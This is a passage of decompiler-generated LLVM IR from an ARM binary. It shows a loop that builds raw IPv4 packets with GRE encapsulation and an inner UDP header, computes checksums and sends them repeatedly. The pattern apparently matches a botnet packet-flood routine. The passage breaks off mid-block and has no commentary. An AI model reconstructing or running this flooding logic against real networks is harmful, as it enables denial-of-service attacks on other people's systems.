  %v3_9188 = mul i32 %v0_9188, 65536
  %v0_9190.not = or i32 %v0_9190, -65536
  %v1_91d0 = xor i32 %v0_9190.not, 65535
  %v3_91d4 = mul i32 %v6_90e8, 65536
  %v1_91d8 = add i32 %v3_91d4, 3407872
  %tmp67 = udiv i32 %v1_91d8, 256
  %v3_91ec = and i32 %tmp67, 65280
  %tmp68 = mul nsw i32 %v1_91d0, 256
  %v3_91f0 = and i32 %tmp68, 65280
  store i32 %v3_91f0, i32* %ip.global-to-local, align 4
  %v1_91f4 = add i32 %v3_91d4, 524288
  %v1_91fc = add i32 %v3_91d4, 1835008
  %tmp69 = udiv i32 %v1_91d0, 256
  %v4_9200 = urem i32 %tmp69, 256
  %v5_9200 = or i32 %v4_9200, %v3_91f0
  %v4_9208 = udiv i32 %v1_91d8, 16777216
  %v5_9208 = or i32 %v3_91ec, %v4_9208
  store i32 %v5_9208, i32* @r8, align 4
  %v3_9214 = udiv i32 %v1_91fc, 256
  %tmp70 = mul i32 %v0_9190, 256
  %v3_9218 = and i32 %tmp70, 65280
  store i32 %v3_9188, i32* %r2.global-to-local, align 4
  %tmp71 = udiv i32 %v0_9190, 256
  %v4_9228 = urem i32 %tmp71, 256
  %v5_9228 = or i32 %v4_9228, %v3_9218
  %tmp72 = mul i32 %v0_9188, 256
  %v3_922c = and i32 %tmp72, 65280
  %v1_9230 = and i32 %v3_9214, 65280
  store i32 %v1_9230, i32* @r6, align 4
  store i32 %v3_918c, i32* %r1.global-to-local, align 4
  %tmp73 = mul i32 %v0_918c, 256
  %v3_923c = and i32 %tmp73, 65280
  %tmp74 = udiv i32 %v0_9188, 256
  %v4_9240 = urem i32 %tmp74, 256
  %v5_9240 = or i32 %v4_9240, %v3_922c
  store i32 %v5_9240, i32* @lr, align 4
  %v4_9244 = udiv i32 %v1_91fc, 16777216
  %v5_9244 = or i32 %v1_9230, %v4_9244
  store i32 %v5_9244, i32* %r3.global-to-local, align 4
  %tmp75 = udiv i32 %v0_918c, 256
  %v4_9248 = urem i32 %tmp75, 256
  %v5_9248 = or i32 %v4_9248, %v3_923c
  %tmp76 = udiv i32 %v1_91f4, 256
  %v3_924c = and i32 %tmp76, 65280
  store i32 %v3_924c, i32* @r5, align 4
  %v4_9260 = udiv i32 %v1_91f4, 16777216
  %v5_9260 = or i32 %v3_924c, %v4_9260
  store i32 %v5_9260, i32* @r7, align 4
  store i32 0, i32* @r4, align 4
  %sext12 = mul nuw i32 %v5_9228, 65536
  %v4_92cc13 = sdiv i32 %sext12, 65536
  %sext8 = mul nuw i32 %v5_9244, 65536
  %v4_9330 = sdiv i32 %sext8, 65536
  %sext9 = mul nuw i32 %v5_9200, 65536
  %v4_9334 = sdiv i32 %sext9, 65536
  %v1_933c = trunc i32 %v4_9330 to i16
  %v2_9364 = icmp eq i32 %v1_9194, 0
  %sext10 = mul nuw i32 %v5_9240, 65536
  %v4_9384 = sdiv i32 %sext10, 65536
  %sext11 = mul nuw i32 %v5_9248, 65536
  %v4_938c = sdiv i32 %sext11, 65536
  %v1_92c4 = trunc i32 %v6_9070 to i8
  br label %dec_label_pc_9268

dec_label_pc_9268:                                ; preds = %bb82, %dec_label_pc_91cc
  store i32 4, i32* %r1.global-to-local, align 4
  %v2_9274 = call i32 @function_1214c(i32 1510, i32 4)
  store i32 %v2_901c, i32* %r2.global-to-local, align 4
  %v3_927c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_927c, i32* %r3.global-to-local, align 4
  %v2_9280 = load i32, i32* @r4, align 4
  %v5_9280 = mul i32 %v2_9280, 4
  %v6_9280 = add i32 %v5_9280, %v2_901c
  %v7_9280 = inttoptr i32 %v6_9280 to i32*
  store i32 %v2_9274, i32* %v7_9280, align 4
  %v0_9284 = load i32, i32* %r2.global-to-local, align 4
  %v1_9284 = load i32, i32* %r3.global-to-local, align 4
  %v4_9284 = mul i32 %v1_9284, 4
  %v5_9284 = add i32 %v4_9284, %v0_9284
  %v6_9284 = inttoptr i32 %v5_9284 to i32*
  %v7_9284 = load i32, i32* %v6_9284, align 4
  store i32 %v7_9284, i32* %r4.global-to-local, align 4
  %v1_9288 = inttoptr i32 %v7_9284 to i8*
  %v2_9288 = load i8, i8* %v1_9288, align 1
  %tmp = urem i8 %v2_9288, 16
  %v1_928c = zext i8 %tmp to i32
  %v1_9290 = or i32 %v1_928c, 64
  store i32 %v1_9290, i32* %r2.global-to-local, align 4
  %v1_9294 = trunc i32 %v1_9290 to i8
  store i8 %v1_9294, i8* %v1_9288, align 1
  %v0_9298 = load i32, i32* %r3.global-to-local, align 4
  %v5_929c = mul i32 %v0_9298, 24
  store i32 %v5_929c, i32* %r1.global-to-local, align 4
  %v0_92a0 = load i32, i32* %r4.global-to-local, align 4
  %v1_92a0 = inttoptr i32 %v0_92a0 to i8*
  %v2_92a0 = load i8, i8* %v1_92a0, align 1
  %v1_92a4 = and i8 %v2_92a0, -16
  %v1_92a8 = or i8 %v1_92a4, 5
  store i32 %v1_909c, i32* %r5.global-to-local, align 4
  store i8 %v1_92a8, i8* %v1_92a0, align 1
  store i32 %v6_9034, i32* %r2.global-to-local, align 4
  %v2_92b8 = load i32, i32* %r4.global-to-local, align 4
  %v3_92b8 = add i32 %v2_92b8, 1
  %v4_92b8 = inttoptr i32 %v3_92b8 to i8*
  store i8 %v5_9054, i8* %v4_92b8, align 1
  store i32 %v1_9078, i32* %r3.global-to-local, align 4
  %v0_92c0 = load i32, i32* %r5.global-to-local, align 4
  %v2_92c0 = icmp eq i32 %v0_92c0, 0
  store i1 %v2_92c0, i1* %cpsr_z.global-to-local, align 1
  %v2_92c4 = load i32, i32* %r4.global-to-local, align 4
  %v3_92c4 = add i32 %v2_92c4, 8
  %v4_92c4 = inttoptr i32 %v3_92c4 to i8*
  store i8 %v1_92c4, i8* %v4_92c4, align 1
  %v0_92c8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_92c8, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_9268
  store i32 %v4_92cc13, i32* %r5.global-to-local, align 4
  br label %bb77

bb:                                               ; preds = %dec_label_pc_9268
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v4_92cc13, i32* %r5.global-to-local, align 4
  %v3_92d0 = load i32, i32* %r4.global-to-local, align 4
  %v4_92d0 = add i32 %v3_92d0, 6
  %v5_92d0 = inttoptr i32 %v4_92d0 to i16*
  store i16 64, i16* %v5_92d0, align 2
  br label %bb77

bb77:                                             ; preds = %.thread, %bb
  %v2_92d8 = load i32, i32* %r4.global-to-local, align 4
  %v3_92d8 = add i32 %v2_92d8, 9
  %v4_92d8 = inttoptr i32 %v3_92d8 to i8*
  store i8 47, i8* %v4_92d8, align 1
  %v0_92dc = load i32, i32* %r4.global-to-local, align 4
  %v1_92dc = add i32 %v0_92dc, 20
  store i32 %v1_92dc, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  %v0_92e4 = load i32, i32* %r5.global-to-local, align 4
  %v1_92e4 = trunc i32 %v0_92e4 to i16
  %v3_92e4 = add i32 %v0_92dc, 4
  %v4_92e4 = inttoptr i32 %v3_92e4 to i16*
  store i16 %v1_92e4, i16* %v4_92e4, align 2
  %v0_92e8 = load i32, i32* @r8, align 4
  %v1_92e8 = trunc i32 %v0_92e8 to i16
  %v2_92e8 = load i32, i32* %r4.global-to-local, align 4
  %v3_92e8 = add i32 %v2_92e8, 2
  %v4_92e8 = inttoptr i32 %v3_92e8 to i16*
  store i16 %v1_92e8, i16* %v4_92e8, align 2
  %v0_92ec = load i32, i32* %r3.global-to-local, align 4
  %v1_92ec = trunc i32 %v0_92ec to i16
  %v2_92ec = load i32, i32* %r2.global-to-local, align 4
  %v3_92ec = add i32 %v2_92ec, 2
  %v4_92ec = inttoptr i32 %v3_92ec to i16*
  store i16 %v1_92ec, i16* %v4_92ec, align 2
  store i32 %v6_913c, i32* %r3.global-to-local, align 4
  %v0_92f4 = load i32, i32* %r4.global-to-local, align 4
  %v1_92f4 = add i32 %v0_92f4, 24
  %v2_92f4 = inttoptr i32 %v1_92f4 to i8*
  %v3_92f4 = load i8, i8* %v2_92f4, align 1
  %v4_92f4 = zext i8 %v3_92f4 to i32
  store i32 %v4_92f4, i32* %r2.global-to-local, align 4
  %v2_92f8 = add i32 %v0_92f4, 12
  %v3_92f8 = inttoptr i32 %v2_92f8 to i32*
  store i32 %v6_913c, i32* %v3_92f8, align 4
  %v0_92fc = load i32, i32* %r2.global-to-local, align 4
  %v1_92fc = and i32 %v0_92fc, -241
  %v1_9300 = or i32 %v1_92fc, 64
  store i32 %v1_9300, i32* %r2.global-to-local, align 4
  %v0_9304 = load i32, i32* %r1.global-to-local, align 4
  %v1_9304 = load i32, i32* @sb, align 4
  %v2_9304 = add i32 %v1_9304, %v0_9304
  store i32 %v2_9304, i32* %r1.global-to-local, align 4
  %v1_9308 = add i32 %v2_9304, 16
  %v2_9308 = inttoptr i32 %v1_9308 to i32*
  %v3_9308 = load i32, i32* %v2_9308, align 4
  store i32 %v3_9308, i32* %r1.global-to-local, align 4
  %v1_930c = trunc i32 %v1_9300 to i8
  %v2_930c = load i32, i32* %r4.global-to-local, align 4
  %v3_930c = add i32 %v2_930c, 24
  %v4_930c = inttoptr i32 %v3_930c to i8*
  store i8 %v1_930c, i8* %v4_930c, align 1
  %v0_9310 = load i32, i32* %r4.global-to-local, align 4
  %v1_9310 = add i32 %v0_9310, 24
  %v2_9310 = inttoptr i32 %v1_9310 to i8*
  %v3_9310 = load i8, i8* %v2_9310, align 1
  %v1_9314 = and i8 %v3_9310, -16
  %v1_9318 = or i8 %v1_9314, 5
  store i8 %v1_9318, i8* %v2_9310, align 1
  %v0_9320 = load i32, i32* %r1.global-to-local, align 4
  %v1_9320 = load i32, i32* %r4.global-to-local, align 4
  %v2_9320 = add i32 %v1_9320, 16
  %v3_9320 = inttoptr i32 %v2_9320 to i32*
  store i32 %v0_9320, i32* %v3_9320, align 4
  %v0_9328 = load i32, i32* %r4.global-to-local, align 4
  %v1_9328 = add i32 %v0_9328, 24
  store i32 %v1_9328, i32* @r5, align 4
  %v3_932c = add i32 %v0_9328, 25
  %v4_932c = inttoptr i32 %v3_932c to i8*
  store i8 %v5_9054, i8* %v4_932c, align 1
  store i32 %v4_9330, i32* %r2.global-to-local, align 4
  store i32 %v4_9334, i32* %r3.global-to-local, align 4
  store i32 %v1_9078, i32* %r1.global-to-local, align 4
  %v2_933c = load i32, i32* @r5, align 4
  %v3_933c = add i32 %v2_933c, 2
  %v4_933c = inttoptr i32 %v3_933c to i16*
  store i16 %v1_933c, i16* %v4_933c, align 2
  %v0_9340 = load i32, i32* %r3.global-to-local, align 4
  %v1_9340 = trunc i32 %v0_9340 to i16
  %v2_9340 = load i32, i32* @r5, align 4
  %v3_9340 = add i32 %v2_9340, 4
  %v4_9340 = inttoptr i32 %v3_9340 to i16*
  store i16 %v1_9340, i16* %v4_9340, align 2
  %v0_9344 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9344, label %bb79, label %bb78

bb78:                                             ; preds = %bb77
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb79

bb79:                                             ; preds = %bb77, %bb78
  store i32 17, i32* %r3.global-to-local, align 4
  %v0_934c = load i32, i32* %r1.global-to-local, align 4
  %v1_934c = trunc i32 %v0_934c to i8
  %v2_934c = load i32, i32* @r5, align 4
  %v3_934c = add i32 %v2_934c, 8
  %v4_934c = inttoptr i32 %v3_934c to i8*
  store i8 %v1_934c, i8* %v4_934c, align 1
  %v0_9350 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9350, label %bb81, label %bb80

bb80:                                             ; preds = %bb79
  %v1_9350 = load i32, i32* %r2.global-to-local, align 4
  %v2_9350 = trunc i32 %v1_9350 to i16
  %v3_9350 = load i32, i32* @r5, align 4
  %v4_9350 = add i32 %v3_9350, 6
  %v5_9350 = inttoptr i32 %v4_9350 to i16*
  store i16 %v2_9350, i16* %v5_9350, align 2
  br label %bb81

bb81:                                             ; preds = %bb79, %bb80
  %v0_9354 = load i32, i32* %r3.global-to-local, align 4
  %v1_9354 = trunc i32 %v0_9354 to i8
  %v2_9354 = load i32, i32* @r5, align 4
  %v3_9354 = add i32 %v2_9354, 9
  %v4_9354 = inttoptr i32 %v3_9354 to i8*
  store i8 %v1_9354, i8* %v4_9354, align 1
  %v0_9358 = call i32 @function_e0b4()
  store i32 %v1_9194, i32* %r1.global-to-local, align 4
  store i1 %v2_9364, i1* %cpsr_z.global-to-local, align 1
  %v1_9368 = sub i32 1023, %v0_9358
  store i32 %v1_9368, i32* %r3.global-to-local, align 4
  br i1 %v2_9364, label %.thread14, label %.thread15

.thread14:                                        ; preds = %bb81
  %v2_9370 = load i32, i32* @r5, align 4
  %v3_9370 = add i32 %v2_9370, 16
  %v4_9370 = inttoptr i32 %v3_9370 to i32*
  store i32 %v1_9368, i32* %v4_9370, align 4
  br label %bb82

.thread15:                                        ; preds = %bb81
  %v1_936c = load i32, i32* %r4.global-to-local, align 4
  %v2_936c = add i32 %v1_936c, 16
  %v3_936c = inttoptr i32 %v2_936c to i32*
  %v4_936c = load i32, i32* %v3_936c, align 4
  store i32 %v4_936c, i32* %r3.global-to-local, align 4
  %v2_9374 = load i32, i32* @r5, align 4
  %v3_9374 = add i32 %v2_9374, 16
  %v4_9374 = inttoptr i32 %v3_9374 to i32*
  store i32 %v4_936c, i32* %v4_9374, align 4
  br label %bb82

bb82:                                             ; preds = %.thread14, %.thread15
  %v1_9378 = load i32, i32* @r5, align 4
  %v2_9378 = add i32 %v1_9378, 12
  %v3_9378 = inttoptr i32 %v2_9378 to i32*
  store i32 %v0_9358, i32* %v3_9378, align 4
  %v3_937c = load i32, i32* %stack_var_-44, align 4
  %v0_9380 = load i32, i32* %r4.global-to-local, align 4
  %v1_9380 = add i32 %v0_9380, 44
  store i32 %v1_9380, i32* @r6, align 4
  store i32 %v4_9384, i32* %r2.global-to-local, align 4
  %v1_9388 = add i32 %v3_937c, 1
  store i32 %v1_9388, i32* @r4, align 4
  store i32 %v4_938c, i32* %r3.global-to-local, align 4
  %v1_9390 = load i32, i32* @sl, align 4
  %v9_9390 = icmp eq i32 %v1_9388, %v1_9390
  store i1 %v9_9390, i1* %cpsr_z.global-to-local, align 1
  %v0_9394 = load i32, i32* @r7, align 4
  %v1_9394 = trunc i32 %v0_9394 to i16
  %v3_9394 = add i32 %v0_9380, 48
  %v4_9394 = inttoptr i32 %v3_9394 to i16*
  store i16 %v1_9394, i16* %v4_9394, align 2
  %v0_9398 = load i32, i32* %r2.global-to-local, align 4
  %v1_9398 = trunc i32 %v0_9398 to i16
  %v2_9398 = load i32, i32* @r6, align 4
  %v3_9398 = inttoptr i32 %v2_9398 to i16*
  store i16 %v1_9398, i16* %v3_9398, align 2
  %v0_939c = load i32, i32* %r3.global-to-local, align 4
  %v1_939c = trunc i32 %v0_939c to i16
  %v2_939c = load i32, i32* @r6, align 4
  %v3_939c = add i32 %v2_939c, 2
  %v4_939c = inttoptr i32 %v3_939c to i16*
  store i16 %v1_939c, i16* %v4_939c, align 2
  %v0_93a0 = load i32, i32* @r4, align 4
  store i32 %v0_93a0, i32* %stack_var_-44, align 4
  %v5_93a4 = icmp slt i32 %v1_9388, %v1_9390
  br i1 %v5_93a4, label %dec_label_pc_9268, label %dec_label_pc_93a8

dec_label_pc_93a8:                                ; preds = %bb82
  store i32 %v6_90e8, i32* %r5.global-to-local, align 4
  %v1_93b0 = add i32 %v6_90e8, 8
  store i32 %v1_93b0, i32* %r4.global-to-local, align 4
  %v0_93c0.pre.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_93bc.preheader

dec_label_pc_93bc.preheader:                      ; preds = %dec_label_pc_93a8, %dec_label_pc_9600
  %v0_93c0.pre = phi i32 [ %v0_93c0.pre.pre, %dec_label_pc_93a8 ], [ 0, %dec_label_pc_9600 ]
  %stack_var_-124.0.ph = phi i32 [ %v1_93b0, %dec_label_pc_93a8 ], [ %v1_9608, %dec_label_pc_9600 ]
  %storemerge = add i32 %v6_90e8, 52
  store i32 %storemerge, i32* @r8, align 4
  %v2_95b4 = icmp eq i32 %v1_9194, 0
  %v2_95d0 = icmp eq i32 %v1_9108, 0
  %v2_93fc = icmp eq i32 %v6_913c, -1
  %v7_93fc = icmp eq i32 %v6_913c, -1
  br label %dec_label_pc_93bc

dec_label_pc_93bc:                                ; preds = %dec_label_pc_93bc, %dec_label_pc_944c, %dec_label_pc_93bc.preheader
  %v0_93c0 = phi i32 [ %v0_93c0.pre, %dec_label_pc_93bc.preheader ], [ 0, %dec_label_pc_93bc ], [ %v1_94e8, %dec_label_pc_944c ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_93c0 = icmp eq i32 %v0_93c0, 0
  store i1 %v2_93c0, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_93c0, label %dec_label_pc_93bc, label %dec_label_pc_93cc

dec_label_pc_93cc:                                ; preds = %dec_label_pc_93bc
  br label %dec_label_pc_93d0

dec_label_pc_93d0:                                ; preds = %dec_label_pc_944c, %dec_label_pc_93cc
  %v1_93e4 = phi i32 [ %v1_94e4, %dec_label_pc_944c ], [ 0, %dec_label_pc_93cc ]
  %v5_93d4 = mul i32 %v1_93e4, 24
  %v1_93d8 = load i32, i32* @sb, align 4
  %v2_93d8 = add i32 %v1_93d8, %v5_93d4
  store i32 %v2_93d8, i32* %r3.global-to-local, align 4
  store i32 %v2_901c, i32* %r4.global-to-local, align 4
  %v1_93e0 = add i32 %v2_93d8, 20
  %v2_93e0 = inttoptr i32 %v1_93e0 to i8*
  %v3_93e0 = load i8, i8* %v2_93e0, align 1
  %v4_93e0 = zext i8 %v3_93e0 to i32
  store i32 %v4_93e0, i32* %r2.global-to-local, align 4
  %v4_93e4 = mul i32 %v1_93e4, 4
  %v5_93e4 = add i32 %v4_93e4, %v2_901c
  %v6_93e4 = inttoptr i32 %v5_93e4 to i32*
  %v7_93e4 = load i32, i32* %v6_93e4, align 4
  store i32 %v7_93e4, i32* @r5, align 4
  %v7_93e8 = icmp eq i8 %v3_93e0, 31
  store i1 %v7_93e8, i1* %cpsr_z.global-to-local, align 1
  %v1_93ec = add i32 %v7_93e4, 24
  store i32 %v1_93ec, i32* @r6, align 4
  %v1_93f0 = add i32 %v7_93e4, 44
  store i32 %v1_93f0, i32* @r7, align 4
  %tmp86 = icmp ult i8 %v3_93e0, 32
  br i1 %tmp86, label %dec_label_pc_94f8, label %dec_label_pc_93f8

dec_label_pc_93f8:                                ; preds = %dec_label_pc_93d0
  store i32 %v6_913c, i32* %r1.global-to-local, align 4
  store i1 %v7_93fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_93fc, label %dec_label_pc_9558, label %dec_label_pc_9404

dec_label_pc_9404:                                ; preds = %dec_label_pc_94f8, %dec_label_pc_93f8
  store i32 65535, i32* %r4.global-to-local, align 4
  %v0_940c = load i32, i32* @fp, align 4
  %v9_940c = icmp eq i32 %v0_940c, 65535
  store i1 %v9_940c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_940c, label %dec_label_pc_9570, label %dec_label_pc_9414

dec_label_pc_9414:                                ; preds = %dec_label_pc_9558.dec_label_pc_9414_crit_edge, %dec_label_pc_9404
  %v1_9418 = phi i32 [ %v1_9418.pre, %dec_label_pc_9558.dec_label_pc_9414_crit_edge ], [ 65535, %dec_label_pc_9404 ]
  store i32 %v3_919c, i32* %r2.global-to-local, align 4
  %v9_9418 = icmp eq i32 %v3_919c, %v1_9418
  store i1 %v9_9418, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9418, label %dec_label_pc_9598, label %dec_label_pc_9420

dec_label_pc_9420:                                ; preds = %dec_label_pc_9570.dec_label_pc_9420_crit_edge, %dec_label_pc_9414
  %v1_9424 = phi i32 [ %v1_9424.pre, %dec_label_pc_9570.dec_label_pc_9420_crit_edge ], [ %v1_9418, %dec_label_pc_9414 ]
  store i32 %v3_91a0, i32* %r3.global-to-local, align 4
  %v9_9424 = icmp eq i32 %v3_91a0, %v1_9424
  store i1 %v9_9424, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9424, label %dec_label_pc_95ac, label %dec_label_pc_942c

dec_label_pc_942c:                                ; preds = %dec_label_pc_9598, %dec_label_pc_9420
  store i32 %v1_9194, i32* @r4, align 4
  store i1 %v2_95b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_95b4, label %dec_label_pc_95c8, label %.thread16

.thread16:                                        ; preds = %dec_label_pc_942c
  %v1_9434 = load i32, i32* @r5, align 4
  %v2_9434 = add i32 %v1_9434, 16
  %v3_9434 = inttoptr i32 %v2_9434 to i32*
  %v4_9434 = load i32, i32* %v3_9434, align 4
  store i32 %v4_9434, i32* %r3.global-to-local, align 4
  %v2_9438 = load i32, i32* @r6, align 4
  %v3_9438 = add i32 %v2_9438, 16
  %v4_9438 = inttoptr i32 %v3_9438 to i32*
  store i32 %v4_9434, i32* %v4_9438, align 4
  br label %dec_label_pc_9440

dec_label_pc_9440:                                ; preds = %bb85, %.thread16
  store i32 %v1_9108, i32* %r1.global-to-local, align 4
  store i1 %v2_95d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_95d0, label %dec_label_pc_944c, label %dec_label_pc_95dc

dec_label_pc_944c:                                ; preds = %dec_label_pc_9440, %dec_label_pc_95c8, %dec_label_pc_95dc
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_9450 = load i32, i32* @r5, align 4
  %v3_9450 = add i32 %v2_9450, 10
  %v4_9450 = inttoptr i32 %v3_9450 to i16*
  store i16 0, i16* %v4_9450, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_9458 = load i32, i32* @r5, align 4
  store i32 %v0_9458, i32* @r0, align 4
  %v2_945c = call i32 @function_c848(i32 %v0_9458, i32 20)
  %v3_945c = trunc i32 %v2_945c to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_9464 = load i32, i32* @r5, align 4
  %v4_9464 = add i32 %v3_9464, 10
  %v5_9464 = inttoptr i32 %v4_9464 to i16*
  store i16 %v3_945c, i16* %v5_9464, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_946c = load i32, i32* %r3.global-to-local, align 4
  %v1_946c = trunc i32 %v0_946c to i16
  %v2_946c = load i32, i32* @r6, align 4
  %v3_946c = add i32 %v2_946c, 10
  %v4_946c = inttoptr i32 %v3_946c to i16*
  store i16 %v1_946c, i16* %v4_946c, align 2
  %v0_9470 = load i32, i32* @r6, align 4
  store i32 %v0_9470, i32* @r0, align 4
  %v2_9474 = call i32 @function_c848(i32 %v0_9470, i32 20)
  %v3_9474 = trunc i32 %v2_9474 to i16
  %v3_9478 = load i32, i32* @r6, align 4
  %v4_9478 = add i32 %v3_9478, 10
  %v5_9478 = inttoptr i32 %v4_9478 to i16*
  store i16 %v3_9474, i16* %v5_9478, align 2
  store i32 0, i32* @r4, align 4
  %v0_9480 = load i32, i32* @r7, align 4
  store i32 %v0_9480, i32* @r1, align 4
  %v1_9484 = add i32 %v0_9480, 4
  %v2_9484 = inttoptr i32 %v1_9484 to i16*
  %v3_9484 = load i16, i16* %v2_9484, align 2
  %v4_9484 = zext i16 %v3_9484 to i32
  store i32 %v4_9484, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-124.0.ph, i32* %r3.global-to-local, align 4
  %v3_948c = add i32 %v0_9480, 6
  %v4_948c = inttoptr i32 %v3_948c to i16*
  store i16 0, i16* %v4_948c, align 2
  %v0_9490 = load i32, i32* @r6, align 4
  %v4_9494 = call i32 @function_c898(i32 %v0_9490, i32 %v0_9480, i32 %v4_9484, i32 %stack_var_-124.0.ph)
  %v5_9494 = trunc i32 %v4_9494 to i16
  %v3_9498 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9498, i32* %r2.global-to-local, align 4
  %v3_949c = mul i32 %v3_9498, 32
  store i32 %v3_949c, i32* %r3.global-to-local, align 4
  %v0_94a0 = load i32, i32* @r5, align 4
  %v1_94a0 = add i32 %v0_94a0, 16
  %v2_94a0 = inttoptr i32 %v1_94a0 to i32*
  %v3_94a0 = load i32, i32* %v2_94a0, align 4
  %v5_94a4 = mul i32 %v3_9498, 24
  store i32 %v5_94a4, i32* %r3.global-to-local, align 4
  %v1_94a8 = load i32, i32* @sb, align 4
  %v2_94a8 = add i32 %v1_94a8, %v5_94a4
  store i32 %v2_94a8, i32* @lr, align 4
  %v2_94ac = add i32 %v2_94a8, 4
  %v3_94ac = inttoptr i32 %v2_94ac to i32*
  store i32 %v3_94a0, i32* %v3_94ac, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_94b4 = load i32, i32* @r7, align 4
  %v4_94b4 = add i32 %v3_94b4, 6
  %v5_94b4 = inttoptr i32 %v4_94b4 to i16*
  store i16 %v5_9494, i16* %v5_94b4, align 2
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_94bc = load i32, i32* %r1.global-to-local, align 4
  %v1_94bc = trunc i32 %v0_94bc to i16
  %v2_94bc = load i32, i32* %r3.global-to-local, align 4
  %v3_94bc = load i32, i32* @sb, align 4
  %v4_94bc = add i32 %v3_94bc, %v2_94bc
  %v5_94bc = inttoptr i32 %v4_94bc to i16*
  store i16 %v1_94bc, i16* %v5_94bc, align 2
  %v0_94c0 = load i32, i32* @r4, align 4
  %v1_94c0 = trunc i32 %v0_94c0 to i16
  %v2_94c0 = load i32, i32* @lr, align 4
  %v3_94c0 = add i32 %v2_94c0, 2
  %v4_94c0 = inttoptr i32 %v3_94c0 to i16*
  store i16 %v1_94c0, i16* %v4_94c0, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_94c8 = load i32, i32* @r5, align 4
  store i32 %v0_94c8, i32* %r1.global-to-local, align 4
  %v0_94d0 = load i32, i32* @r8, align 4
  store i32 %v0_94d0, i32* %r2.global-to-local, align 4
  %v0_94d4 = load i32, i32* @lr, align 4
  %v0_94d8 = load i32, i32* %ip.global-to-local, align 4
  %v6_94dc = call i32 @function_11560(i32 %v3_9150, i32 %v0_94c8, i32 %v0_94d0, i32 16384, i32 %v0_94d4, i32 %v0_94d8)
  %v3_94e0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_94e0, i32* %r3.global-to-local, align 4
  %v1_94e4 = add i32 %v3_94e0, 1
  %v1_94e8 = load i32, i32* @sl, align 4
  %v9_94e8 = icmp eq i32 %v1_94e4, %v1_94e8
  store i1 %v9_94e8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_94e4, i32* %stack_var_-44, align 4
  %v6_94f0 = icmp slt i32 %v1_94e4, %v1_94e8
  br i1 %v6_94f0, label %dec_label_pc_93d0, label %dec_label_pc_93bc

dec_label_pc_94f8:                                ; preds = %dec_label_pc_93d0
  %v1_94f8 = add i32 %v2_93d8, 16
  %v2_94f8 = inttoptr i32 %v1_94f8 to i32*
  %v3_94f8 = load i32, i32* %v2_94f8, align 4
  store i32 %v3_94f8, i32* %r4.global-to-local, align 4
  %v0_94fc = call i32 @function_e0b4()
  %v3_9500 = load i32, i32* %stack_var_-44, align 4
  %v5_9508 = mul i32 %v3_9500, 24
  %v0_950c = load i32, i32* %r4.global-to-local, align 4
  %v1_950c = and i32 %v0_950c, 16711680
  store i32 %v1_950c, i32* %ip.global-to-local, align 4
  %v3_9510 = udiv i32 %v0_950c, 16777216
  %v4_9514 = udiv i32 %v1_950c, 256
  %v5_9514 = or i32 %v4_9514, %v3_9510
  store i32 %v5_9514, i32* %r2.global-to-local, align 4
  %v1_9518 = load i32, i32* @sb, align 4
  %v2_9518 = add i32 %v1_9518, %v5_9508
  store i32 %v2_9518, i32* %r1.global-to-local, align 4
  %v1_951c = and i32 %v0_950c, 65280
  store i32 %v1_951c, i32* %r3.global-to-local, align 4
  %v1_9520 = add i32 %v2_9518, 20
  %v2_9520 = inttoptr i32 %v1_9520 to i8*
  %v3_9520 = load i8, i8* %v2_9520, align 1
  %v4_9520 = zext i8 %v3_9520 to i32
  store i32 %v4_9520, i32* %ip.global-to-local, align 4
  %v5_9528 = call i32 @llvm.bswap.i32(i32 %v0_950c)
  %v7_952c = lshr i32 %v0_94fc, %v4_9520
  %v8_952c = add i32 %v7_952c, %v5_9528
  store i32 %v8_952c, i32* %r2.global-to-local, align 4
  store i32 %v6_913c, i32* %r1.global-to-local, align 4
  %v5_9548 = call i32 @llvm.bswap.i32(i32 %v8_952c)
  store i32 %v5_9548, i32* %r3.global-to-local, align 4
  store i1 %v7_93fc, i1* %cpsr_z.global-to-local, align 1
  %v1_9550 = load i32, i32* @r5, align 4
  %v2_9550 = add i32 %v1_9550, 16
  %v3_9550 = inttoptr i32 %v2_9550 to i32*
  store i32 %v5_9548, i32* %v3_9550, align 4
  br i1 %v2_93fc, label %dec_label_pc_9558, label %dec_label_pc_9404

dec_label_pc_9558:                                ; preds = %dec_label_pc_94f8, %dec_label_pc_93f8
  %v0_9558 = call i32 @function_e0b4()
  store i32 65535, i32* %r4.global-to-local, align 4
  %v0_9564 = load i32, i32* @fp, align 4
  %v9_9564 = icmp eq i32 %v0_9564, 65535
  store i1 %v9_9564, i1* %cpsr_z.global-to-local, align 1
  %v1_9568 = load i32, i32* @r5, align 4
  %v2_9568 = add i32 %v1_9568, 12
  %v3_9568 = inttoptr i32 %v2_9568 to i32*
  store i32 %v0_9558, i32* %v3_9568, align 4
  br i1 %v9_9564, label %dec_label_pc_9570, label %dec_label_pc_9558.dec_label_pc_9414_crit_edge

dec_label_pc_9558.dec_label_pc_9414_crit_edge:    ; preds = %dec_label_pc_9558
